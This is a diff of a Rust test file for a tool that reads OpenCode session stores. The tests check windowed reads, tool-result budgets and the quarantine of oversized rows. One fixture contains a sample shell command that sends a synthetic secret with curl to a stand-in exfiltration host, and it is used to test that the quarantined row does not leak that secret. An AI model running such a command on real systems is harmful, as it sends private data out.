@@ -16,12 +16,11 @@ use crate::acquisition::{
     AcquisitionProgress, AttestedValue, BoundedReadError, OpenCodeSqliteReadOptions,
     acquire_opencode_sqlite,
 };
-use crate::source_read::SourceReadError;
 use telltale_schema::clients::{ClientId, SourceKind};
 use telltale_schema::observation::{
-    CanonicalObservationV2, CapabilityAvailability, CapabilityId, FactProvenance, JsonValue,
-    MessageRole, ObservationBody, ObservationFamily, ObservationStage, ObservedAt,
-    SemanticReplayVerdict, ToolObservation, ToolStatus,
+    BoundDimension, CanonicalFieldCategory, CanonicalObservationV2, CapabilityAvailability,
+    CapabilityId, FactProvenance, JsonValue, MessageRole, ObservationBody, ObservationFamily,
+    ObservationStage, ObservedAt, SemanticReplayVerdict, ToolObservation, ToolStatus,
 };
 use telltale_schema::source::Source;
 
@@ -296,7 +295,8 @@ fn fresh_v2_store_maps_messages_tools_and_accounting() {
     assert_eq!(
         batch.progress,
         AcquisitionProgress::OpenCodeSessionMessages {
-            message_max_time_updated: Some(T0 + 30_000)
+            message_max_time_updated: Some(T0 + 30_000),
+            window_complete: true,
         }
     );
     use ObservationStage::*;
@@ -484,10 +484,15 @@ fn tool_lifecycle_separates_requests_outcomes_and_reported_execution() {
             &JsonValue::Bool(executed)
         );
     }
-    for child in [4, 5] {
-        let failed = tool(find(&batch, "msg_tools", child, ToolResultReturned));
+    for (child, error_type) in [(4, "aborted"), (5, "tool.input-json")] {
+        let returned = find(&batch, "msg_tools", child, ToolResultReturned);
+        assert_eq!(
+            returned.facets()["tool.error_type"].value(),
+            &JsonValue::string(error_type)
+        );
+        let failed = tool(returned);
         assert_eq!(failed.reported_status(), Some(ToolStatus::Failed));
-        assert!(matches!(failed.result(), Some(JsonValue::Object(_))));
+        assert!(matches!(failed.result(), Some(JsonValue::String(_))));
         assert_eq!(
             tool(find(&batch, "msg_tools", child, ToolRequested)).reported_status(),
             None
@@ -1190,7 +1195,8 @@ fn schema_selection_is_deterministic_and_never_falls_back_to_legacy() {
     assert_eq!(
         batch.progress,
         AcquisitionProgress::OpenCodeSessionMessages {
-            message_max_time_updated: Some(T0)
+            message_max_time_updated: Some(T0),
+            window_complete: true,
         }
     );
     assert_eq!(batch.accounting.sessions.len(), 1);
@@ -1203,7 +1209,8 @@ fn schema_selection_is_deterministic_and_never_falls_back_to_legacy() {
     assert_eq!(
         batch.progress,
         AcquisitionProgress::OpenCodeSessionMessages {
-            message_max_time_updated: None
+            message_max_time_updated: None,
+            window_complete: true,
         }
     );
 
@@ -1261,7 +1268,8 @@ fn bootstrap_sampling_incremental_limits_and_regression() {
     assert_eq!(
         sampled.progress,
         AcquisitionProgress::OpenCodeSessionMessages {
-            message_max_time_updated: Some(T0 + 3)
+            message_max_time_updated: Some(T0 + 3),
+            window_complete: true,
         }
     );
     let incremental = |limit| {
@@ -1271,11 +1279,13 @@ fn bootstrap_sampling_incremental_limits_and_regression() {
             ..Default::default()
         })
     };
+    // Without a resume point a cut window is progress, not saturation.
     assert_eq!(
-        incremental(1).err(),
-        Some(AcquisitionError::BoundedSourceRead(
-            BoundedReadError::LimitExceeded
-        ))
+        incremental(1).unwrap().progress,
+        AcquisitionProgress::OpenCodeSessionMessages {
+            message_max_time_updated: Some(T0 + 2),
+            window_complete: false,
+        }
     );
     assert_eq!(incremental(2).unwrap().observations.len(), 2);
 
@@ -1295,7 +1305,8 @@ fn bootstrap_sampling_incremental_limits_and_regression() {
     assert_eq!(
         batch.progress,
         AcquisitionProgress::OpenCodeSessionMessages {
-            message_max_time_updated: Some(T0 + 3)
+            message_max_time_updated: Some(T0 + 3),
+            window_complete: true,
         }
     );
     // And a v2 cursor does not apply to a legacy store.
@@ -1356,7 +1367,8 @@ fn in_place_updates_are_reselected_by_update_coordinate_not_seq() {
     assert_eq!(
         batch.progress,
         AcquisitionProgress::OpenCodeSessionMessages {
-            message_max_time_updated: Some(T0 + 3 * HOUR)
+            message_max_time_updated: Some(T0 + 3 * HOUR),
+            window_complete: true,
         }
     );
     assert!(
@@ -1388,17 +1400,19 @@ fn equal_timestamps_cross_pages_and_late_failures_reject_the_source() {
         )
     };
     for page in [1, 2, 5, 6] {
-        let (records, high_water) = read(5, page).unwrap();
-        assert_eq!(high_water, Some(T0));
+        let (records, truncated, next) = read(5, page).unwrap();
+        assert!(!truncated);
+        assert_eq!(next, None);
         assert_eq!(
             records.iter().map(|record| record.seq).collect::<Vec<_>>(),
             [1, 2, 3, 4, 5],
             "page {page}"
         );
-        assert!(matches!(
-            read(4, page),
-            Err(SourceReadError::Bounded(BoundedReadError::LimitExceeded))
-        ));
+        // Over the limit, the selection is cut at the limit, not rejected.
+        let (records, truncated, next) = read(4, page).unwrap();
+        assert!(truncated, "page {page}");
+        assert_eq!(records.len(), 4);
+        assert_eq!(next, Some(T0), "the cut splits a timestamp group");
     }
 
     store
@@ -1447,7 +1461,7 @@ fn read_snapshot_pins_every_page_including_committed_wal_contents() {
             )
             .unwrap();
     });
-    let (records, _) =
+    let (records, ..) =
         extract_incremental_messages(&snapshot, T0, 10, 1, &mut SqliteAdmission::default())
             .unwrap();
     assert_eq!(records.len(), 3, "later pages read the pinned snapshot");
@@ -1492,8 +1506,8 @@ fn admission_caps_and_canonical_budgets_reject_atomically() {
     let mut exact = SqliteAdmission::with_limits(usize::MAX, 3);
     assert!(extract_incremental_messages(&store.connection, T0, 10, 2, &mut exact).is_ok());
 
-    // A sole text result uses the direct-text budget; structured multi-part
-    // results keep ordinary nested string bounds.
+    // All-text results use the direct-text budget; results with file parts
+    // stay structured and keep ordinary nested string bounds.
     let long = "x".repeat(60_000);
     let store = Store::v2();
     store.message(
@@ -1522,16 +1536,25 @@ fn admission_caps_and_canonical_budgets_reject_atomically() {
                 "call",
                 Some(false),
                 json!({"status": "completed", "input": {}, "content": [
-                {"type": "text", "text": "y".repeat(5_000)}, {"type": "text", "text": "z"}]}),
+                {"type": "text", "text": "z"},
+                {"type": "file", "uri": "file:///synthetic", "mime": "text/plain", "name": "y".repeat(5_000)}]}),
                 json!({"created": T0})
             )]),
             T0,
         ),
     );
-    assert!(matches!(
-        store.acquire_default_error(),
-        AcquisitionError::CanonicalBoundValidation { .. }
-    ));
+    let quarantined_bound = |store: &Store| {
+        let batch = store.acquire_default();
+        assert!(batch.observations.is_empty());
+        let [unit] = batch.quarantined.as_slice() else {
+            panic!("expected one quarantined row")
+        };
+        unit.bound.unwrap()
+    };
+    assert_eq!(
+        quarantined_bound(&store).category,
+        CanonicalFieldCategory::ToolResult
+    );
     let store = Store::v2();
     store.message(
         "msg_huge",
@@ -1548,10 +1571,10 @@ fn admission_caps_and_canonical_budgets_reject_atomically() {
             T0,
         ),
     );
-    assert!(matches!(
-        store.acquire_default_error(),
-        AcquisitionError::CanonicalBoundValidation { .. }
-    ));
+    assert_eq!(
+        quarantined_bound(&store).dimension,
+        BoundDimension::StringBytes
+    );
 }
 
 #[test]
@@ -1639,7 +1662,8 @@ fn contributions_count_requests_not_returned_payloads() {
     assert_eq!(contributions.tool_calls.get("read"), Some(&1));
     assert_eq!(contributions.tool_calls.get("shell"), Some(&1));
 
-    // The fail-closed bound still applies to request input.
+    // The contribution bound still applies to request input: the row is
+    // quarantined with the bound's code instead of being counted.
     let rejected = Store::v2();
     rejected.message(
         "msg_tools",
@@ -1649,15 +1673,377 @@ fn contributions_count_requests_not_returned_payloads() {
             json!([completed_tool(
                 "call_write",
                 "write",
-                json!({"filePath": "./out.b64", "content": encoded}),
+                json!({"path": "./out.b64", "content": encoded}),
                 "ok",
                 T0
             )]),
             T0,
         ),
     );
+    let batch = rejected.acquire_default();
+    assert!(batch.observations.is_empty());
+    assert_eq!(batch.quarantined.len(), 1);
+    assert_eq!(batch.quarantined[0].code, "invalid_native_contribution");
+    assert!(
+        batch.accounting.sessions[0]
+            .counts
+            .contributions
+            .tool_calls
+            .is_empty()
+    );
+}
+
+/// Live OpenCode v2.0.28 stores routinely exceed the ordinary 4,096-byte string
+/// bound in authored-text inputs and in multi-part or error results. Exact
+/// `(tool, field)` pairs get the 65,536-byte direct-text budget instead.
+#[test]
+fn authored_text_and_returned_payloads_use_direct_text_budgets() {
+    let long = |marker: &str| format!("{} {marker}", "word ".repeat(2_000));
+    let entry = |id: &str, name: &str, state: Value| {
+        json!({"type": "tool", "id": id, "name": name, "executed": false, "state": state,
+               "time": {"created": T0, "ran": T0 + 1, "completed": T0 + 2}})
+    };
+    let done = |input: Value| json!({"status": "completed", "input": input, "content": [{"type": "text", "text": "ok"}]});
+    let image = format!("data:image/png;base64,{}", "QUJD".repeat(30_000));
+    let store = Store::v2();
+    store.message(
+        "msg_long",
+        1,
+        T0 + 10,
+        assistant(
+            json!([
+                entry("c_shell", "shell", done(json!({"command": long("shell-end-marker"), "workdir": "."}))),
+                entry("c_bash", "bash", done(json!({"command": long("bash-end-marker")}))),
+                entry("c_patch", "patch", done(json!({"patchText": long("patch-end-marker")}))),
+                entry("c_write", "write", done(json!({"path": "./notes.md", "content": long("write-end")}))),
+                entry("c_edit", "edit", done(json!({"path": "~/.ssh/config", "oldString": long("old"), "newString": long("new")}))),
+                entry("c_exec", "execute", done(json!({"code": long("exec-end")}))),
+                entry("c_agent", "subagent", done(json!({"prompt": long("agent-end")}))),
+                entry("c_read", "read", json!({"status": "completed", "input": {"path": "./shot.png"},
+                    "content": [{"type": "text", "text": "Image read"},
+                                {"type": "file", "uri": image, "mime": "image/png", "name": "shot.png"}]})),
+                entry("c_fetch", "webfetch", json!({"status": "completed", "input": {"url": "https://example.test/"},
+                    "content": [{"type": "text", "text": long("page")}, {"type": "text", "text": "notice"}]})),
+                entry("c_fail", "glob", json!({"status": "error", "input": {"pattern": "**/*", "path": "/"},
+                    "error": {"type": "tool.execution", "message": long("error-end")}})),
+            ]),
+            T0,
+        ),
+    );
+    let batch = store.acquire_default();
+    use ObservationStage::*;
+    let request = |child| find(&batch, "msg_long", child, ToolRequested);
+    let returned = |child| find(&batch, "msg_long", child, ToolResultReturned);
+    let argument = |child, key: &str| match tool(request(child)).arguments() {
+        Some(JsonValue::Object(members)) => members[key].clone(),
+        other => panic!("child {child}: {other:?}"),
+    };
+
+    for (child, key, marker) in [
+        (0, "command", "shell-end-marker"),
+        (1, "command", "bash-end-marker"),
+        (2, "patchText", "patch-end-marker"),
+        (3, "content", "write-end"),
+        (4, "newString", "new"),
+        (5, "code", "exec-end"),
+        (6, "prompt", "agent-end"),
+    ] {
+        assert_eq!(
+            argument(child, key),
+            JsonValue::string(long(marker)),
+            "child {child}"
+        );
+    }
     assert_eq!(
-        rejected.acquire_default_error(),
-        AcquisitionError::InvalidContribution
+        request(0).facets()["command.text"].value(),
+        &JsonValue::string(long("shell-end-marker"))
+    );
+    // v2 file tools name their path `path`.
+    for (child, path) in [(3, "./notes.md"), (4, "~/.ssh/config"), (7, "./shot.png")] {
+        assert_eq!(
+            request(child).facets()["resource.path"].value(),
+            &JsonValue::string(path),
+            "child {child}"
+        );
+    }
+    assert!(
+        !request(9).facets().contains_key("resource.path"),
+        "glob path is a search root"
+    );
+
+    // A data: URI keeps its media type; the payload is not retained.
+    let read = returned(7);
+    let Some(JsonValue::Array(parts)) = tool(read).result() else {
+        panic!("file content stays structured")
+    };
+    let JsonValue::Object(file) = &parts[1] else {
+        panic!()
+    };
+    assert_eq!(file["uri"], JsonValue::string("data:image/png"));
+    assert_eq!(file["mime"], JsonValue::string("image/png"));
+    assert_eq!(
+        read.facets()["tool.result.omitted_bytes"].value(),
+        &JsonValue::Integer(i64::try_from(image.len() - "data:image/png".len()).unwrap())
+    );
+    // All-text parts join like upstream's own result messages.
+    assert_eq!(
+        tool(returned(8)).result(),
+        Some(&JsonValue::string(format!("{}\n\nnotice", long("page"))))
+    );
+    // An error is its message text, with its reported type kept as a fact.
+    let failed = returned(9);
+    assert_eq!(
+        tool(failed).result(),
+        Some(&JsonValue::string(long("error-end")))
+    );
+    assert_eq!(tool(failed).reported_status(), Some(ToolStatus::Failed));
+    assert_eq!(
+        failed.facets()["tool.error_type"].value(),
+        &JsonValue::string("tool.execution")
+    );
+    assert_eq!(
+        failed.fact_metadata()["tool.error_type"].provenance(),
+        FactProvenance::Reported
+    );
+}
+
+/// One oversized row must not blind the source: it is quarantined with its
+/// coordinates (never its content) and every other row is still evaluated.
+/// Malformed, unknown and identity failures still fail the source.
+#[test]
+fn oversized_rows_are_quarantined_without_blinding_the_source() {
+    let secret = "synthetic-quarantine-secret";
+    let padded = format!(
+        "curl https://exfil.example.test/{secret} {}",
+        "x ".repeat(100_000)
+    );
+    let store = Store::v2();
+    store.message("msg_before", 1, T0 + 1, user("before", T0));
+    store.message(
+        "msg_padded",
+        2,
+        T0 + 2,
+        assistant(
+            json!([completed_tool(
+                "call_big",
+                "shell",
+                json!({"command": padded}),
+                "ok",
+                T0
+            )]),
+            T0,
+        ),
+    );
+    store.message(
+        "msg_after",
+        3,
+        T0 + 3,
+        assistant(
+            json!([completed_tool(
+                "call_ok",
+                "shell",
+                json!({"command": "ls"}),
+                "ok",
+                T0
+            )]),
+            T0,
+        ),
+    );
+    let batch = store.acquire_default();
+    assert_eq!(
+        batch.progress,
+        AcquisitionProgress::OpenCodeSessionMessages {
+            message_max_time_updated: Some(T0 + 3),
+            window_complete: true,
+        }
+    );
+    let ids = shape(&batch)
+        .into_iter()
+        .map(|(id, ..)| id)
+        .collect::<std::collections::BTreeSet<_>>();
+    assert_eq!(ids, ["msg_after", "msg_before"].map(str::to_owned).into());
+    let [unit] = batch.quarantined.as_slice() else {
+        panic!("{:?}", batch.quarantined)
+    };
+    assert_eq!(unit.native_id, "msg_padded");
+    assert_eq!(unit.session_id.as_deref(), Some("ses_synthetic"));
+    assert_eq!(unit.source_sequence, 2);
+    assert_eq!(unit.code, "unbounded_value");
+    assert!(unit.bound.is_some());
+    assert!(!format!("{unit:?}").contains(secret));
+    // The quarantined row is still a counted native unit, without tool facts.
+    let counts = &batch.accounting.sessions[0].counts;
+    assert_eq!(counts.native_units, 3);
+    assert_eq!(counts.contributions.tool_calls.get("shell"), Some(&1));
+    assert!(counts.contributions.network_hosts.is_empty());
+
+    // Integrity failures are not size failures.
+    store.message(
+        "msg_bad",
+        4,
+        T0 + 4,
+        json!({"type": "assistant", "content": "not an array"}),
+    );
+    assert_eq!(
+        mapping_code(store.acquire_default_error()),
+        "invalid_assistant_content"
+    );
+}
+
+/// A selection larger than one window's retained budget or row limit is
+/// evaluated in successive windows instead of failing. Each window ends on a
+/// row boundary, reports itself incomplete, and moves progress to its last
+/// admitted row; the next read resumes from there minus the overlap until
+/// the backlog is drained. A window that cannot advance past its resume
+/// point still fails as saturated.
+#[test]
+fn oversized_selections_roll_through_windows_until_drained() {
+    let store = Store::v2();
+    // Each row retains roughly 100 KB (arguments on request and result), so
+    // 100 rows need more than one 8 MiB window.
+    let patch = format!("*** Begin Patch\n{}", "+line\n".repeat(7_000));
+    let rows = 100;
+    for seq in 1..=rows {
+        store.message(
+            &format!("msg_{seq:03}"),
+            seq,
+            T0 + seq * HOUR,
+            assistant(
+                json!([completed_tool(
+                    &format!("call_{seq}"),
+                    "patch",
+                    json!({"patchText": patch}),
+                    "ok",
+                    T0
+                )]),
+                T0,
+            ),
+        );
+    }
+    let mut seen = std::collections::BTreeSet::new();
+    let mut read = OpenCodeSqliteReadOptions {
+        message_limit: 1_000,
+        ..Default::default()
+    };
+    let mut windows = 0;
+    loop {
+        windows += 1;
+        assert!(windows <= 10, "backlog must drain");
+        let batch = store.acquire(read).unwrap();
+        assert!(batch.quarantined.is_empty());
+        seen.extend(shape(&batch).into_iter().map(|(id, ..)| id));
+        let AcquisitionProgress::OpenCodeSessionMessages {
+            message_max_time_updated: Some(high_water),
+            window_complete,
+        } = batch.progress
+        else {
+            panic!("{:?}", batch.progress)
+        };
+        if window_complete {
+            assert_eq!(high_water, T0 + rows * HOUR);
+            break;
+        }
+        assert!(high_water < T0 + rows * HOUR);
+        read = OpenCodeSqliteReadOptions::default().resume_session_messages_after(high_water);
+    }
+    assert!(windows >= 2, "one window cannot hold {rows} rows");
+    assert_eq!(
+        seen.len(),
+        usize::try_from(rows).unwrap(),
+        "every row evaluated"
+    );
+
+    // The row limit rolls the same way.
+    let small = Store::v2();
+    for seq in 1..=3 {
+        small.message(
+            &format!("msg_{seq}"),
+            seq,
+            T0 + seq * HOUR,
+            user("text", T0),
+        );
+    }
+    let first = small
+        .acquire(OpenCodeSqliteReadOptions {
+            message_min_time_updated: Some(T0),
+            message_limit: 2,
+            ..Default::default()
+        })
+        .unwrap();
+    assert_eq!(
+        first.progress,
+        AcquisitionProgress::OpenCodeSessionMessages {
+            message_max_time_updated: Some(T0 + 2 * HOUR),
+            window_complete: false,
+        }
+    );
+
+    // More rows inside the overlap than one window holds: the cut window may
+    // end before the resume point, and continuing strictly after it (without
+    // the overlap) still drains the rest.
+    let packed = Store::v2();
+    for seq in 1..=3 {
+        packed.message(&format!("msg_{seq}"), seq, T0 + seq, user("text", T0));
+    }
+    let resume = OpenCodeSqliteReadOptions {
+        message_limit: 2,
+        ..OpenCodeSqliteReadOptions::default().resume_session_messages_after(T0 + 3)
+    };
+    let cut = packed.acquire(resume).unwrap();
+    assert_eq!(
+        cut.progress,
+        AcquisitionProgress::OpenCodeSessionMessages {
+            message_max_time_updated: Some(T0 + 2),
+            window_complete: false,
+        }
+    );
+    let rest = packed
+        .acquire(OpenCodeSqliteReadOptions::default().continue_session_messages_after(T0 + 2))
+        .unwrap();
+    assert_eq!(
+        shape(&rest)
+            .into_iter()
+            .map(|(id, ..)| id)
+            .collect::<Vec<_>>(),
+        ["msg_3"]
+    );
+    assert_eq!(
+        rest.progress,
+        AcquisitionProgress::OpenCodeSessionMessages {
+            message_max_time_updated: Some(T0 + 3),
+            window_complete: true,
+        }
+    );
+
+    // A cut never splits rows sharing one `time_updated`: it backs off to the
+    // previous timestamp, and fails only when one timestamp fills a window.
+    let ties = Store::v2();
+    ties.message("msg_a", 1, T0, user("text", T0));
+    for seq in 2..=4 {
+        ties.message(&format!("msg_{seq}"), seq, T0 + 1, user("text", T0));
+    }
+    let limited = |limit| OpenCodeSqliteReadOptions {
+        message_min_time_updated: Some(T0),
+        message_limit: limit,
+        ..Default::default()
+    };
+    let backed_off = ties.acquire(limited(3)).unwrap();
+    assert_eq!(
+        backed_off.progress,
+        AcquisitionProgress::OpenCodeSessionMessages {
+            message_max_time_updated: Some(T0),
+            window_complete: false,
+        }
+    );
+    assert_eq!(backed_off.observations.len(), 1);
+    let saturated = Store::v2();
+    for seq in 1..=3 {
+        saturated.message(&format!("msg_{seq}"), seq, T0, user("text", T0));
+    }
+    assert_eq!(
+        saturated.acquire(limited(2)).err(),
+        Some(AcquisitionError::BoundedSourceRead(
+            BoundedReadError::LimitExceeded
+        ))
     );
 }
